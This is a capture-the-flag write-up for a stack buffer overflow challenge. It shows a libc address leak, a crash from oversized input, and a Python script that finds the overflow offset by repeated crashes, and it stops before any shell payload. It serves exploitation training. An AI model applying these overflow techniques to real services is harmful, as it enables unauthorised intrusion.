# [PWN] Overflow the Gate

# Description 

A remote service is running on the server and accepts user input over a TCP connection.

You can connect to it using:

```ruby
nc overflow-the-gate.sactf.staccahstaccah.it 1337
```

The service appears simple, but it was compiled with modern protections enabled. Careful analysis and precise control of execution flow will be required to retrieve the flag.

You are provided with the binary and the required runtime files to reproduce the service locally.

# Solution

So the challenge provides a remote service accessible via TCP.

We are also provided with 

- the service binary (chall)
- the libc.so.6 library used by the server
- the dynamic loader ld-linux-x86-64.so.2

The goal is to exploit a vulnerability to obtain a remote shell and retrieve the flag.

if we run the binary

```bash
$ ./chall
```
we obtain:
```
=== Overflow the Gate ===
Welcome!
puts @ 0x7ff448333e50
Send your payload:
```

The program prints the address of `puts` in libc directly, causing a libc leak.

What we can try now is to test the behavior of the program.

if we give a few characters as imput we recieve

```
=== Overflow the Gate ===
Welcome!
puts @ 0x7fdcd74d5e50
Send your payload:
Bye!
```

but if we send a big amount of characters

```
python3 -c "print('A'*200)" | ./chall
```

we get a **segmentation fault**
```
=== Overflow the Gate ===
Welcome!
puts @ 0x7f61b7e7be50
Send your payload:
Bye!
Segmentation fault
```
This indicates that the buffer on the stack is being overwritten and that the program is attempting to return to an invalid address, confirming the presence of a **buffer overflow**

So what we do now?

If we can identify the offset (the distance between the start of the buffer and the point where the program decides where to return after a function) we can write “useless” data up to that point and then you decide where the program should jump.
We have to identify the exact number of bytes to write before reaching the return address.

To do so we will use a python script that with a cyclic pattern, passing recursively a more amount of data trying to find the exact amout where the program crash.

``` python
import subprocess

binary = "./chall"

for i in range(1, 200):
    payload = b"A" * i

    try:
        p = subprocess.Popen(
            [binary],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        out, err = p.communicate(payload, timeout=1)

        if p.returncode is not None and p.returncode < 0:
            print(f"[+] Segmentation fault a {i} byte")
            break
        else:
            print(f"[-] {i} byte: OK")

    except Exception as e:
        print(f"[!] Errore a {i} byte: {e}")
        break
```

![oftg](attachments/Offset.png)




















